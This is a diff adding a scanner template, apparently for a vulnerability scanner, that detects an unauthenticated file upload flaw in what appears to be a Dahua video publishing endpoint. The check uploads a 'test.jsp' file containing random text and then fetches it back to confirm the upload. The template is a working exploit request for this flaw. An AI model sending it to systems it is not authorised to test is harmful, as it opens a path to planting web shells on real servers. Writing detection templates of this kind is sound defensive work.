@@ -1,0 +1,31 @@
+name: dahua-zhyq-video-fileupload
+set:
+    randstr: randomLowercase(10)
+    randbody: randomLowercase(30)
+    rboundary: randomLowercase(8)
+rules:
+  - method: POST
+    path: "/publishing/publishing/material/file/video"
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"Filedata\"; filename=\"test.jsp\"\r\n\
+        \r\n\
+        {{randbody}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"Submit\"\r\n\
+        \r\n\
+        submit\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: |
+      response.status == 200  && response.body.bcontains(b'"path":')
+    output:
+      search: '"\"path\":\"(?P<path>.*?)\"".bsubmatch(response.body)'
+      path: search["path"]
+  - method: GET
+    path: "/publishingImg/{{path}}"
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(randbody))
+detail:
+  author: 666
